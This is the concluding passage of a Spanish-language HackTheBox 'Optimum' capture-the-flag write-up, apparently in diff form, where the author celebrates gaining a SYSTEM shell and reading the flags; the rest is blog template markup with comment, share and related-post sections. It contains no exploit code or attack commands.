+<p>Tamos tamos tamoooooooooooooooooooooooooooos, hemos migrado al usuario <code>nt authority\system</code> y obtenido una <strong>terminal</strong> como él (:</p>
+
+<p>Linda manera de escalar, me g u s t o.</p>
+
+<p>Ya podríamos ver las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>…</p>
+
+<p>Me gusto bastante la máquina, sobre todo la escalada, no me había topado con ese “problema” de estar en una arquitectura pero a la vez no, loco loco.</p>
+
+<p>Este es el final de nuestro encuentro, pero nos leeremos con más cositas, bendiciones, besitos y como siempre, a seguir rompiendo tooooooooooooodo!!</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Optimum&url=http://localhost:4000/htb/optimum" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#HFS">HFS</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#MS16-135">MS16-135</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#PSarchitecture">PSarchitecture</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#kernel-exploit">kernel-exploit</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/bastard">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bastard/7banner.png" alt="HackTheBox - Bastard"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/bastard">HackTheBox - Bastard</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio, vamos a romper Drupal 7.54 y veremos dos maneras de escalar, generando procesos maliciosos con ayuda del privilegio SeImpersonate y de JuicyPotato o explotando el lindo...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">11 Aug 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/help">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170banner.png" alt="HackTheBox - Help"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/help">HackTheBox - Help</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil. Investigaremos subidas de archivos .php en el servicio HelpDeskZ, jueguitos sucios con MySQL y una explotación de un kernel con ganas de morir.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">22 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
